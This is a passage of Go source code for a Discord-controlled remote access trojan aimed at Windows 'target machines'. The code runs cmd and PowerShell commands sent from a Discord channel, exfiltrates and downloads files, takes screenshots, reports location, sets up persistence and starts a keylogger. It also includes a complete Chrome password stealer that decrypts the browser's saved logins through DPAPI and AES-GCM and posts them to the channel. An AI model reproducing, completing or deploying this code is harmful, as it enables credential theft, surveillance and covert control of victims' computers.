	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: responseMessage,
		},
	})
}

// handleChangeDirectory handles the "cd" command, retrieving the path, changing the directory, and sending the response
func handleChangeDirectory(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Check if the path argument is provided
	if len(i.ApplicationCommandData().Options) == 0 {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error: No path provided.",
			},
		})
		return
	}

	// Retrieve the path argument from the command
	path := i.ApplicationCommandData().Options[0].StringValue()

	// Try to change the directory
	err := os.Chdir(path)
	if err != nil {
		// Respond with an error if the directory change fails
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error changing directory: %v", err),
			},
		})
		return
	}

	// Respond with success if the directory change succeeds
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: fmt.Sprintf("Successfully changed directory to: %s", path),
		},
	})
}

// Function to handle the bot shutdown
func handleShutdown(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Respond to the interaction
	if err := s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Shutting down the bot... Goodbye! 👋",
		},
	}); err != nil {
		fmt.Printf("Error responding to interaction: %v\n", err)
	}

	// Close the Discord session and exit
	s.Close()
	os.Exit(0)
}

func handleUploadCommand(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Extract the URL and path options
	url := i.ApplicationCommandData().Options[0].StringValue()
	path := i.ApplicationCommandData().Options[1].StringValue()

	// Upload the file from the URL
	if err := uploadFileFromURL(s, i, url, path); err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error uploading file from URL: " + err.Error(),
			},
		})
		return
	}
}

func uploadFileFromURL(s *discordgo.Session, i *discordgo.InteractionCreate, url, path string) error {
	// Create the file at the specified path
	out, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("error creating file: %w", err)
	}
	defer out.Close()

	// Download the file from the provided URL
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("error downloading file: %w", err)
	}
	defer resp.Body.Close()

	// Check if the response status is OK
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("error: received status code %d", resp.StatusCode)
	}

	// Write the response body to the file
	if _, err := io.Copy(out, resp.Body); err != nil {
		return fmt.Errorf("error writing to file: %w", err)
	}

	// Send a confirmation message back to Discord
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Uploaded file from URL to " + path,
		},
	})
	return nil
}

// Function to list directory contents with bash styling
func handleListDirectory(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Retrieve the directory path from the command options
	var path string
	if len(i.ApplicationCommandData().Options) > 0 {
		path = i.ApplicationCommandData().Options[0].StringValue()
	} else {
		path = "." // Default to current directory
	}

	// Attempt to list the directory contents
	files, err := os.ReadDir(path)
	if err != nil {
		// Respond with an error message if the directory listing fails
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error listing directory: %v", err),
			},
		})
		return
	}

	// Build the directory contents string
	var contents []string
	for _, file := range files {
		contents = append(contents, file.Name())
	}

	// Join contents and format them in bash-style for Discord
	dirList := strings.Join(contents, "\n")
	formattedContents := fmt.Sprintf("```bash\n%s\n```", dirList)

	// Respond with the directory contents
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: fmt.Sprintf("Contents of `%s`:\n%s", path, formattedContents),
		},
	})
}

// Function to change the wallpaper based on the operating system
func handleWallpaperChange(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Get the image URL from the command options
	if len(i.ApplicationCommandData().Options) == 0 {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error: No URL provided.",
			},
		})
		return
	}
	url := i.ApplicationCommandData().Options[0].StringValue()

	// Download and change wallpaper using the provided URL
	err := func(imageURL string) error {
		// Download the image
		response, err := http.Get(imageURL)
		if err != nil {
			return fmt.Errorf("error downloading image: %v", err)
		}
		defer response.Body.Close()

		// Check if the response is successful
		if response.StatusCode != http.StatusOK {
			return fmt.Errorf("failed to download image: status code %d", response.StatusCode)
		}

		// Create a temporary file to save the downloaded image
		tempFile, err := os.CreateTemp("", "wallpaper.*.jpg")
		if err != nil {
			return fmt.Errorf("error creating temp file: %v", err)
		}
		defer os.Remove(tempFile.Name()) // Clean up temp file

		// Write the image data to the temp file
		_, err = io.Copy(tempFile, response.Body)
		if err != nil {
			return fmt.Errorf("error saving image to temp file: %v", err)
		}

		// Close the temp file to ensure all data is flushed
		if err := tempFile.Close(); err != nil {
			return fmt.Errorf("error closing temp file: %v", err)
		}

		// Set the wallpaper using the wallpaper package
		err = wallpaper.SetFromFile(tempFile.Name())
		if err != nil {
			return fmt.Errorf("error setting wallpaper: %v", err)
		}

		// Optional: Sleep for a moment to ensure the update takes effect
		time.Sleep(1 * time.Second)

		return nil
	}(url)

	// Respond with appropriate message based on the outcome
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error changing wallpaper: %v", err),
			},
		})
	} else {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Wallpaper changed successfully!",
			},
		})
	}
}

// Function to handle the "creds" command
func handleCreds(s *discordgo.Session, message interface{}) {
	// Retrieve credentials
	creds, err := stealChromePasswords()
	if err != nil {
		resp := fmt.Sprintf("Error retrieving credentials: %s", err)
		if interaction, ok := message.(*discordgo.InteractionCreate); ok {
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: resp,
				},
			})
		} else if msg, ok := message.(*discordgo.MessageCreate); ok {
			s.ChannelMessageSend(msg.ChannelID, resp)
		}
		return
	}

	// Prepare the response message
	var response string
	for url, credsList := range creds {
		response += fmt.Sprintf("Site: %s\n", url)
		for _, cred := range credsList {
			response += fmt.Sprintf("Username: %s, Password: %s, Date Created: %s\n",
				cred["username"], cred["password"], cred["dateCreated"])
		}
		response += "--------------------\n"
	}

	// Send the response (check if the response is too long)
	if interaction, ok := message.(*discordgo.InteractionCreate); ok {
		sendLongMessage(s, interaction.ChannelID, []byte(response), nil)
	} else if msg, ok := message.(*discordgo.MessageCreate); ok {
		sendLongMessage(s, msg.ChannelID, []byte(response), msg.Reference())
	}
}

// stealChromePasswords extracts and decrypts Chrome passwords.
func stealChromePasswords() (map[string][]map[string]string, error) {
	// Function to convert Chrome's time format to a readable one
	chromeTimeToTime := func(chromeTime int64) time.Time {
		return time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Microsecond * time.Duration(chromeTime))
	}

	// Function to decrypt the encrypted key using Windows API
	decryptKey := func(encryptedKey []byte) ([]byte, error) {
		encryptedKey = encryptedKey[5:] // Remove DPAPI prefix
		var outBlob windows.DataBlob
		var inBlob windows.DataBlob
		inBlob.Size = uint32(len(encryptedKey))
		inBlob.Data = &encryptedKey[0]

		r, _, err := procCryptUnprotectData.Call(
			uintptr(unsafe.Pointer(&inBlob)),
			0,
			0,
			0,
			0,
			0,
			uintptr(unsafe.Pointer(&outBlob)),
		)
		if r == 0 {
			return nil, err
		}
		defer windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.Data)))

		decryptedKey := (*[1 << 30]byte)(unsafe.Pointer(outBlob.Data))[:outBlob.Size:outBlob.Size]
		return decryptedKey, nil
	}

	// Function to decrypt AES encrypted password
	decryptPassword := func(encPassword []byte, key []byte) (string, error) {
		if len(encPassword) < 15 {
			return "", fmt.Errorf("encrypted password too short")
		}

		iv := encPassword[3:15]
		encPassword = encPassword[15:]

		block, err := aes.NewCipher(key)
		if err != nil {
			return "", err
		}

		aesGCM, err := cipher.NewGCM(block)
		if err != nil {
			return "", err
		}

		decryptedPassword, err := aesGCM.Open(nil, iv, encPassword, nil)
		if err != nil {
			return "", err
		}

		return string(decryptedPassword), nil
	}

	// Function to retrieve the encryption key from Chrome's Local State file
	getEncryptionKey := func() ([]byte, error) {
		localStatePath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
		localStateFile, err := os.ReadFile(localStatePath)
		if err != nil {
			return nil, err
		}

		var localState struct {
			OSCrypt struct {
				EncryptedKey string `json:"encrypted_key"`
			} `json:"os_crypt"`
		}

		err = json.Unmarshal(localStateFile, &localState)
		if err != nil {
			return nil, err
		}

		encryptedKey, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
		if err != nil {
			return nil, err
		}

		return decryptKey(encryptedKey)
	}

	// Path to Chrome's Login Data (SQLite database)
	dbPath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	tempDbPath := "chrome_login_data.db"
	err := copyFile(dbPath, tempDbPath)
	if err != nil {
		return nil, err
	}
	defer os.Remove(tempDbPath)

	db, err := sql.Open("sqlite", tempDbPath)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	encKey, err := getEncryptionKey()
	if err != nil {
		return nil, err
	}

	rows, err := db.Query("SELECT origin_url, username_value, password_value, date_created FROM logins")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	credentials := make(map[string][]map[string]string)

	for rows.Next() {
		var originURL, username string
		var encPassword []byte
		var dateCreated int64

		err := rows.Scan(&originURL, &username, &encPassword, &dateCreated)
		if err != nil {
			continue
		}

		password, err := decryptPassword(encPassword, encKey)
		if err != nil {
			password = "Error decrypting"
		}

		credentials[originURL] = append(credentials[originURL], map[string]string{
			"username":    username,
			"password":    password,
			"dateCreated": chromeTimeToTime(dateCreated).String(),
		})
	}

	return credentials, nil
}

func InteractionHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {

	if i == nil {
		fmt.Println("Interaction is nil")
		return
	}

	// Ensure we handle interactions correctly
	if i.Type == discordgo.InteractionMessageComponent && i.Message == nil {
		fmt.Println("InteractionMessageComponent without a Message")
		return
	}

	// Check for correct channel and ignore bot's own interactions
	if (i.Type == discordgo.InteractionApplicationCommand && i.ChannelID != MyChannelId) ||
		(i.Type == discordgo.InteractionMessageComponent && i.Message.ChannelID != MyChannelId) ||
		(i.Member.User.ID == s.State.User.ID) {
		return
	}
	
	switch i.Type {
	case discordgo.InteractionMessageComponent:
		HandleButtonInteraction(s, i) // Separate function to handle button clicks

	case discordgo.InteractionApplicationCommand:
		SlashCommandHandler(s, i) // Handle slash commands

	default:
		fmt.Println("Unhandled interaction type:", i.Type)
	}
}

// Example of handling button interactions
func HandleButtonInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
	switch i.MessageComponentData().CustomID {
	case "terminate":
		fmt.Println("Terminating session...")
		go handleShutdown(s, i)
	case "process":
		fmt.Println("Listing processes...")
		go handleListProcesses(s, i)
	case "screenshot":
		fmt.Println("Taking screenshot...")
		go handleScreenshot(s, i)
	case "help":
		fmt.Println("Displaying help...")
		go helpCommand(s, i.ChannelID)
	case "location":
		fmt.Println("Getting location...")
		go handleLocation(s, i)
	case "creds":
		fmt.Println("Getting credentials...")
		go handleCreds(s, i)
	}
}

// handler manages the incoming Discord commands
func Handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore messages in other channels and own messages
	if m.ChannelID != MyChannelId || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐") // Processing...

	switch {
	case strings.HasPrefix(m.Content, "🏃‍♂️"):
		go runCommand(s, m, m.Content[14:])
	case m.Content == "📸":
		go handleScreenshot(s, m)
	case strings.HasPrefix(m.Content, "👇"):
		go handleFileDownload(s, m)
	case strings.HasPrefix(m.Content, "☝️"):
		go handleFileUpload(s, m)
	case m.Content == "💀":
		s.Close()
		os.Exit(0)
	case strings.HasPrefix(m.Content, "!help"):
		go helpCommand(s, m.ChannelID)
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
}

// slashCommandHandler handles the new slash commands
func SlashCommandHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {
	switch i.ApplicationCommandData().Name {
	case "cmd":
		command := i.ApplicationCommandData().Options[0].StringValue()
		runCommand(s, i, command)
	case "powershell":
		command := i.ApplicationCommandData().Options[0].StringValue()
		runPowershellcmd(s, i, command)
	case "help":
		go helpCommand(s, i.ChannelID)
	case "screenshot":
		go handleScreenshot(s, i)
	case "download":
		go handleFileDownload(s, i.Interaction)
	case "location":
		go handleLocation(s, i)
	case "cd":
		go handleChangeDirectory(s, i)
	case "creds":
		go handleCreds(s, i)
	case "upload":
		go handleUploadCommand(s, i)
	case "persistent":
		go handlePersistence(s, i)
	case "ls":
		go handleListDirectory(s, i)
	case "process":
		go handleListProcesses(s, i)
	case "wallpaper":
		go handleWallpaperChange(s, i)
	case "shutdown":
		go handleShutdown(s, i)
	case "keylogger":
		go handleKeyloggerCommand(s, i)
	}
}

// registerCommand is a helper function to create a command and handle errors.
func RegisterCommand(s *discordgo.Session, command *discordgo.ApplicationCommand) {
	_, err := s.ApplicationCommandCreate(s.State.User.ID, MyChannelId, command)
	if err != nil {
		fmt.Printf("Error creating command '%s': %v\n", command.Name, err)
	}
}

// registerSlashCommands registers the new slash commands
func RegisterSlashCommands(s *discordgo.Session) {
	commands := []*discordgo.ApplicationCommand{
		{
			Name:        "cmd",
			Description: "Run a system command",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "command",
					Description: "The system command to run",
					Required:    true,
				},
			},
		},
		{
			Name:        "powershell",
			Description: "Run a PowerShell command",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "command",
					Description: "The PowerShell command to run",
					Required:    true,
				},
			},
		},
		{
			Name:        "help",
			Description: "Displays the help menu",
		},
		{
			Name:        "download",
			Description: "Download a file from the server",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "file",
					Description: "The file path to download",
					Required:    true,
				},
			},
		},
		{
			Name:        "screenshot",
			Description: "Take a screenshot of all displays and send it to the channel",
		},
		{
			Name:        "shutdown",
			Description: "Shuts down the bot.",
		},
		{
			Name:        "location",
			Description: "Get your current IP location.",
		},
		{
			Name:        "cd",
			Description: "Change the working directory.",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Name:        "path",
					Description: "The path to change to.",
					Type:        discordgo.ApplicationCommandOptionString,
					Required:    true,
				},
			},
		},
		{
			Name:        "ls",
			Description: "List the contents of a directory.",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Name:        "path",
					Description: "The directory path to list contents from.",
					Type:        discordgo.ApplicationCommandOptionString,
					Required:    false,
				},
			},
		},
		{
			Name:        "process",
			Description: "List all the processes running on the target machine",
		},
		{
			Name:        "persistent",
			Description: "Make the agent persistent on the target machine.",
		},
		{
			Name:        "creds",
			Description: "Get the credentials of Chrome on the target machine.",
		},
		{
			Name:        "upload",
			Description: "Upload a file from a URL to a specified path.",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "url",
					Description: "URL of the file to upload.",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Path to save the uploaded file.",
					Required:    true,
				},
			},
		},
		{
			Name:        "wallpaper",
			Description: "Change the wallpaper of the target machine.",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "url",
					Description: "The URL of the image to set as wallpaper.",
					Required:    true,
				},
			},
		},
		{
			Name:        "keylogger",
			Description: "Starts a keylogger on the target machine",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "start",
					Description: "Starts the keylogger",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "stop",
					Description: "Stops the keylogger",
					Required:    false,
				},
			},
		},
	}

	for _, command := range commands {
		go RegisterCommand(s, command)
	}
}
